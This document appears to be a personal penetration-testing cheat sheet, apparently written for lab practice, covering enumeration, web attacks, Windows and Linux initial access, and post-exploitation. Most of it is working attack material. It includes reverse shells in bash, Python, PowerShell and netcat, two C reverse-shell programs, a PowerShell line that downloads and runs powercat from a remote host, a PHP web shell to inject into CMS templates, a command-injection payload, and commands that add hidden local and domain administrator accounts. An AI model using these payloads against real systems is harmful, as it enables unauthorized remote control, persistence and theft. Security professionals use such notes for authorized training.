
 [[1_Scripts_1]]  [[Siddicky's Notes]]  [[S1ren's Common]] [[2_Machine Template_2]] 
# Exercise Creds
```
s0l0s0j4
```
```
Password123!
```
My IP
```
192.168.13.37
```
# Common
## Tools and Scripts
	Tools:
```bash
cd /home/s0l0s0j4/TOOLS
```
```bash
python3 -m http.server 8000
```
	Scripts:
```bash
cd /home/s0l0s0j4/SCRIPTS
```
```bash
python3 -m http.server 9000
```
## New Target folder:
```bash
mkdir {vulns,files,nmap} && touch {creds,passwords,users,hashes}
```
## Enumeration:
### [[nmap]]
#### TCP
```bash
nmap -sC -sV -vv -p- -oA nmap/initialScan --open $IP
```
- increased verbosity shows ttl, which is helpful for revealing firewalls, WAFs (cloudflare in Wappalyzer?) and networking devices. Also, [[dnsrecon]] [[censys.io]] SecurityTrails
#### UDP
```bash
nmap -sC -sU -p- -oA nmap/udpScan --open $IP
```

After entering DNS in host file, re-run the script to find additional info/web features:
```bash
nmap -sC -sV -p- -oN nmap/DNS --open $IP
```
### [[autorecon]] 
- Run additional scans while manually enumerating
#### Sudo permissions needed for raw socket access:
```bash
sudo $(which autorecon) -t targets --no-port-dirs
```
	Standard scan, rarely used
```bash
autorecon -t targets
```
### [[nikto]] 
	All checks:
```bash
nikto --host $URL -C all
```
	With host evasion:
```bash
nikto --host $IP -ssl -evasion 1
```
## Web targets?
- Search for exploits for any running applications. Wappalyzer. [[Searchsploit]] 
```bash
curl $URL | grep "version"
```
- Go to each domain name to check for virtual host routing
- Don't forget to change content length in burpsuite. A quick way to make sure it is correct is to change the method from POST, to GET, back to POST. 
### File and directory fuzzing:
- **Always check the webroot first.**
[[wfuzz]],[[gobuster]],[[nikto]],
- Subdomain busting: FUZZ.victimdomain.com
- View the source
- Check the webroot for: 
	- robots.txt
	-  .svn
	- .DS_STORE
	- .git
### Login form?
[[Hydra]], [[wfuzz]], [[SQL Injection]],[[XSS tricks]],
- Default Credentials
- Error-Message Username Enumeration?
- Templating Engine - Try SSTI

### Wordpress? 
[[wpscan]]
### Joomla? 
[[joomscan]]
Find the version:
```bash
$URL/administrator/manifests/files/joomla.xml
```
### droople? 
[[droopescan]]
### php?
- Are there any hidden parameters? [[wfuzz]] [[gobuster]] 
	php info file? Where is the webroot?
### CMS?
- First check templates. Inject something into index.php like:
```php
<?php
if isset($_REQUEST['cmd']) {
	system ($_REQUEST['cmd']);
}
?>
```
- if you don't put the iffthen 'isset', it will error when anyone hits index.php because it can't find the variable. 
### Custom Wordlists - 
[[cewl]] [[crunch]] 
### Pin
[[Pin_bruteforcing]] 
### LFI? 
- Can you overwrite /var/log/apache2/access.log for poisoning?
- any /home/user/.ssh/id_rsa?
- /proc/self/env?
- /etc/knockd.conf - [[Port Knocking]] 
To check whether it is LFI as opposed to directory traversal, try to include a local file that you know is present, like index.php. If it loads within the page, or hangs, it is probably a local file inclusion. 
### File Upload?
- Upload a shell 
- directory busting [[gobuster]] [[wfuzz]] 
### Command Injection
```bash
ip=127.0.0.1JUNKDATA||id
```
- In the case of command execution on the server, look for ways to inject a command. Ex, intentionally causing the first command to fail and using double pipes to execute an alternate 
## [[Abusing SMB]]:
[[netexec]],[[crackmapexec]], [[smbclient]], [[enum4linux]], [[smbmap]], [[rpcclient]], [[nbtscan]], [[nmap]], 
- Check for null authentication (null session.) Start with [[smbclient]], because it usually just works to list shares. then move to [[crackmapexec]] and others.
## [[FTP]]:
- Anonymous access? [[mod_copy]] (target known file such as /etc/passwd)
- Upload/download?

## MSSQL Server?
- Kerberoasting. Usually need a separate user to set up, so a SPN is created. Look for some valid creds.
- [[SQL Injection]] - Authentication Bypass, Information Exfil
- If you have creds, or want to try defaults use the [[impacket]] module. 
## [[Reverse Shells]]:
#### Bash:
```bash
bash -c 'bash -i >& /dev/tcp/10.10.15.50/4444 0>&1'
```
	Need it to run in the background? append the &
```bash
bash -c 'bash -i >& /dev/tcp/10.10.15.49/9001 0>&1 &'
```
#### Autorun Base64 encoded payload:
```bash
echo 'BASE64ENCODEDPAYLOADSTRING | base64 -d | bash'
```
#### Python3:
```python
export RHOST="192.168.45.218";export RPORT=4444;python3 -c 'import sys,socket,os,pty;s=socket.socket();s.connect((os.getenv("RHOST"),int(os.getenv("RPORT"))));[os.dup2(s.fileno(),fd) for fd in (0,1,2)];pty.spawn("sh")'
```
	Encoded:
```
export%20RHOST%3D%22192%2E168%2E45%2E218%22%3Bexport%20RPORT%3D4444%3Bpython3%20%2Dc%20%27import%20sys%2Csocket%2Cos%2Cpty%3Bs%3Dsocket%2Esocket%28%29%3Bs%2Econnect%28%28os%2Egetenv%28%22RHOST%22%29%2Cint%28os%2Egetenv%28%22RPORT%22%29%29%29%29%3B%5Bos%2Edup2%28s%2Efileno%28%29%2Cfd%29%20for%20fd%20in%20%280%2C1%2C2%29%5D%3Bpty%2Espawn%28%22sh%22%29%27
```

#### PowerShell with powercat:
```powershell
powershell.exe -c "IEX(New-Object System.Net.WebClient).DownloadString('http://192.168.45.240:8000/powercat.ps1');powercat -c 192.168.45.240 -p 8888 -e powershell"
```

#### Netcat:
```bash
nc.exe -nv 192.168.45.240 4444 -e cmd.exe
```

#### Need to wrap it in a statement?
```bash
bash -c 'nc -nv 192.168.1.7 9090 -e /bin/bash'
```

#### C
```c
#include <stdio.h>
#include <sys/socket.h>
#include <sys/types.h>
#include <stdlib.h>
#include <unistd.h>
#include <netinet/in.h>
#include <arpa/inet.h>

int main(void){
    int port = 4444;
    struct sockaddr_in revsockaddr;

    int sockt = socket(AF_INET, SOCK_STREAM, 0);
    revsockaddr.sin_family = AF_INET;       
    revsockaddr.sin_port = htons(port);
    revsockaddr.sin_addr.s_addr = inet_addr("10.10.14.232");

    connect(sockt, (struct sockaddr *) &revsockaddr, 
    sizeof(revsockaddr));
    dup2(sockt, 0);
    dup2(sockt, 1);
    dup2(sockt, 2);

    char * const argv[] = {"bash", NULL};
    execvp("bash", argv);

    return 0;       
}
```
  -OR-
```c
#include <stdlib.h>
#include <unistd.h>
#include <sys/wait.h>

int ignored_bool_inputs[] = {-1};
int ignored_bool_outputs[] = {-1};
int ignored_int_inputs[] = {-1};
int ignored_int_outputs[] = {-1};

void initCustomLayer()
{
}

void updateCustomIn()
{
}

#define LHOST "<IP>"
#define LPORT "<PORT>"

void updateCustomOut()
{
    int pipefd[2];
    pid_t pid;

    if (pipe(pipefd) == -1) {
        exit(EXIT_FAILURE);
    }

    pid = fork();
    if (pid == -1) {
        exit(EXIT_FAILURE);
    }

    if (pid == 0) {
        close(pipefd[0]);
        dup2(pipefd[1], STDOUT_FILENO);
        execl("/bin/bash", "/bin/bash", "-c", "/bin/bash -i >& /dev/tcp/" LHOST "/" LPORT " 0>&1 &", NULL);
        exit(EXIT_FAILURE);
    } else {
        close(pipefd[1]);
        wait(NULL);
    }
}
```
## [[Upgrade Shell]] 

## Antivirus killing shell?
- User [[Meterpreter]] to upload and execute a secondary payload. 
- Migrate to another process
- LOLBAS
## Initial Access Windows
### Domain Controller?
- Enumerate Users with [[rpcclient]] - then use [[Kerbrute]] to verify they are valid
### Have usernames? - [[AS-REP Roasting]]
### Have Valid Credentials? - [[Kerberoasting]]
### Have Hashes? - Crack or Pass 'em
[[crackmapexec]] [[Hashcat]] [[JohnTheRipper]] 
### Command Execution Verification - Ping Check
```bash
tcpdump -i any -c5 icmp
```
# Post Access

### Enable RDP:
```powershell
Set-ItemProperty -Path 'HKLM:\System\CurrentControlSet\Control\Terminal Server' -Name "fDenyTSConnections" -Value 0
```
```powershell
Enable-NetFirewallRule -DisplayGroup "Remote Desktop"
```
```powershell
Start-Service -Name TermService
```
	Check status:
```powershell
Get-Service -Name TermService
```

```bash
xfreerdp +clipboard /u:s0l0s0j4 /p:Password123! /v:192.168.13.37 
```
### Add User Windows:
```powershell
net user s0l0s0j4 Password123 /add
```
```powershell
net localgroup Administrators s0l0s0j4 /add
```
	Domain:
```powershell
net user s0l0s0j4 Password123 /add /domain
```
```powershell
net group "Domain Administrators" s0l0s0j4 /add /domain
```
### Add User Linux:
```
sudo adduser s0l0s0j4
```
```
sudo usermod -aG sudo s0l0s0j4
```
```
su s0l0s0j4
```
## Start Monitoring once access is established
[[pspy64]] 
- Displays executive I/O operations
## [[PowerShell]] 

## [[Pivoting]]  

### [[Cracking Hashes]]  
[[Hashcat]] [[JohnTheRipper]]
To find the mode:
```bash
hashcat -h | grep -i "ssh"
```
### [[Pass The Hash]] 
### [[Kerberoasting]] 
### [[AS-REP Roasting]]

# [[Windows Privilege Escalation]]
# [[Linux Privilege Escalation]]

